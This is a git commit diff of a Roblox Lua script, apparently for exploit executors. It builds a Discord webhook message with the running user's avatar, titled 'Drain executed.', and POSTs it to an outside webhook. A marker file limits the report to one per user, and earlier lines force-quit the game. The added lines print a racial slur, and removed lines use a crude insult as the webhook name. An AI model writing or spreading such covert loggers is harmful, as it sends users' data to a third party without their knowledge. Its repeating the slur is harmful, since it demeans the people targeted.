2cc8bff08170cec8db835f6cef6dae6bef2c9d35
Zxlvex <143689150+Zxlvex@users.noreply.github.com>
2023-09-10 11:25:23 +0530

    Update and rename #justiceforthiscode to #justiceforthiscode.lua

--- #justiceforthiscode.lua
+++ #justiceforthiscode.lua
@@ -21,13 +21,13 @@ local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users
 Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
 local AvatarImage = Thing.imageUrl
 local msg = {
-   ["username"] = "Being a pedo",
-   ["avatar_url"] = "https://cdn.discordapp.com/attachments/868496249958060102/901884186267365396/ezgif-2-3c2a2bc53af1.gif",
+   ["username"] = "Drain.",
+   ["avatar_url"] = "https://media.discordapp.net/attachments/1149385361844359318/1150077243821920389/images_20.jpeg",
    ["content"] = ( _G.Discord_UserID ~= "" and  _G.Discord_UserID ~= nil) and tostring("<@".._G.Discord_UserID..">") or " ",
    ["embeds"] = {
        {
            ["color"] = tonumber(tostring("0x32CD32")), --decimal
-           ["title"] = "This Bozo executed.",
+           ["title"] = "Drain executed.",
            ["thumbnail"] = {
                ["url"] = AvatarImage,
            },
@@ -84,11 +84,11 @@ local msg = {
 }
 
 if isfile("Workspace/readthis.txt") then
-    game:Shutdown()
+    print("Yokuso Watashiwa Soul Society")
     else
     request = http_request or request or HttpPost or syn.request
     request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
     makefolder("Workspace")
-    writefile("Workspace/readthis.txt", "true")
-    game:Shutdown()
+    writefile("Workspace/Drain web.txt", "true")
+    print("Got u nigga")
 end
